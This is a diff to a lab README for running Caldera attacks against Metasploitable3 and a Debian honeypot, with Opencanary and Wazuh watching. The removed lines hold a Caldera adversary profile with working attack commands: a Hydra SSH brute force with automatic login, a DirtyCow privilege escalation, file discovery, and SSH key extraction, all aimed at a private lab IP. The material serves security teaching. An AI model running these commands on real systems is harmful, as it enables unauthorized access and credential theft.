@@ -51,16 +51,22 @@ Ensure the following packages are installed:
 ### 2.1 Install Caldera
 1. Install **Node.js** and **Go**:
    > Make sure to install the correct architecture for your host machine.
+   Nodejs
    ```bash
    curl -fsSL https://deb.nodesource.com/setup_20.18.1 | sudo -E bash -
    sudo apt install -y nodejs
    node -v
+   ```
+
+   Golang 
+   ```bash
+   wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz
    sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    go version
    ```
 
-2. Clone the Caldera repository and set up the environment:
+1. Clone the Caldera repository and set up the environment:
    > Only for the first run of Caldera you need to use the flag ```--build```, on next runs just run the server normally.
    ```bash
    git clone https://github.com/mitre/caldera.git --recursive
@@ -70,7 +76,7 @@ Ensure the following packages are installed:
    pip install -r requirements.txt
    python3 server.py --build
    ```
-3. Save the password for ```red``` account, then usnig the browser navigate to port ```8888``` on localhost and login.
+2. Save the password for ```red``` account, then usnig the browser navigate to port ```8888``` on localhost and login.
 
 ### 2.2 Deploy Sandcat Agent
 1. Create a batch file for deploying the agent on Metasploitable3 and Debian:
@@ -174,92 +180,10 @@ Ensure the following packages are installed:
    ```
 
 ### 3.2 Configure Caldera Adversary Profile
-Create a profile for the SSH attack:
-```yaml
-id: 93b4564b-3ce7-465f-8a64-71c02b2cc7ce
-name: SSH Compromiser 1
-description: ---
-objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
-atomic_ordering:
-- c44e5e7c-7a1e-4741-9e20-00b927c7bf3e
-- 550bf3d1-4849-4372-91af-1801113a8347
-- 9590a894-8c72-49ed-abb7-0bd1e8d49d17
-- 01628dc5-be13-465d-8e91-3a02e0e42606
-abilities:
- c44e5e7c-7a1e-4741-9e20-00b927c7bf3e:
-  name:  Brute Force SSH and Login 1
-  tactic:  credential-access
-  technique_name:  "Account Discovery"
-  technique_id:  T1110.001
-  executors: 
-   - sh:
-     platform: linux
-     command: |
-        IP="192.168.56.105";
-        PORT="22";
-        USERLIST="/home/tada/Downloads/user.txt";
-        PASSLIST="/home/tada/Downloads/pass.txt";
-        RESULTFILE="/home/tada/Downloads/ssh_crack.txt";
-        
-        echo "[*] Starting Hydra brute-force, server= $IP";
-        rm -rf $RESULTFILE;
-        hydra -L "$USERLIST" -P "$PASSLIST" ssh://$IP -t 4 -o "$RESULTFILE";
-        
-        if grep -q "login:" "$RESULTFILE"; then
-          echo "[*] Credentials found!";    
-          username=$(grep "login:" "$RESULTFILE" | awk '{print $5}');
-          password=$(grep "login:" "$RESULTFILE" | awk '{print $7}');
-          echo "[*] Using credentials: $username : $password";
-          sshpass -p "$password" ssh -o StrictHostKeyChecking=no -p $PORT $username@$IP;
-          if [[ $? -ne 0 ]]; then
-            exit 1;
-          fi;
-          echo "[*] Logged in as user: $username";
-          exit;
-        else
-          echo "[!] No valid credentials found by Hydra.";
-          exit 1;
-        fi
- 550bf3d1-4849-4372-91af-1801113a8347:
-  name:  Using DirtyCow to gain privilege (Require dirtycow) 1
-  tactic:  privilege-escalation
-  technique_name:  "Exploitation for Privilege Escalation"
-  technique_id:  T1068
-  executors: 
-   - sh:
-     platform: linux
-     command: |
-        echo "user_first : $(whoami)"
-        nohup ./dev/null/dirtycow 1>/dev/null 2>/dev/null;
-        echo "user_become: $(whoami)"
- 9590a894-8c72-49ed-abb7-0bd1e8d49d17:
-  name:  Nix File and Directory Discovery 2/1
-  tactic:  discovery
-  technique_name:  "File and Directory Discovery"
-  technique_id:  T1083
-  executors: 
-   - sh:
-     platform: linux
-     command: |
-       
-        cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name ".*"
- 01628dc5-be13-465d-8e91-3a02e0e42606:
-  name:  Extract SSH Keys 1
-  tactic:  credential-access
-  technique_name:  "Credential Dumping"
-  technique_id:  T1003
-  executors: 
-   - sh:
-     platform: linux
-     command: |
-       
-        if [ -f ~/.ssh/authorized_keys ]; then
-          cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak;
-          ssh_authorized_keys=$(cat ~/.ssh/authorized_keys);
-          echo "$ssh_authorized_keys";
-        fi
-
-```
+Create a profile for the SSH attack like the following:
+   3.2.1 [Adversary for Metasploitable3](./adversaries/SSH Compromiser 1.yaml):
+   3.2.2 [Adversary for Debian(honeypot)](./adversaries/SSH Compromiser 2.yaml): 
+then go to operation tab and create new operation for the selected adversary.
 
 ---
 
@@ -283,3 +207,16 @@ abilities:
 ## 5. Summary
 
 This guide covered the installation, configuration, and execution of attacks using Caldera, Opencanary, and Wazuh. The methods provide insights into the effectiveness of automated and manual attacks while highlighting the differences between a real service and a honeypot.
+
+## 6. References
+
+- [Caldera Documentation](https://github.com/mitre/caldera/wiki)
+- [Opencanary Documentation](https://opencanary.readthedocs.io/)
+- [Wazuh Documentation](https://documentation.wazuh.com/)
+- [Docker Documentation](https://docs.docker.com/)
+- [Hydra Official Website](https://github.com/vanhauser-thc/thc-hydra)
+- [DirtyCow Exploit Information](https://dirtycow.ninja/)
+- [Kali Linux Official Documentation](https://www.kali.org/docs/)
+- [Metasploitable3 Setup Guide](https://github.com/rapid7/metasploitable3)
+- [MITRE ATT&CK](https://attack.mitre.org/)
+
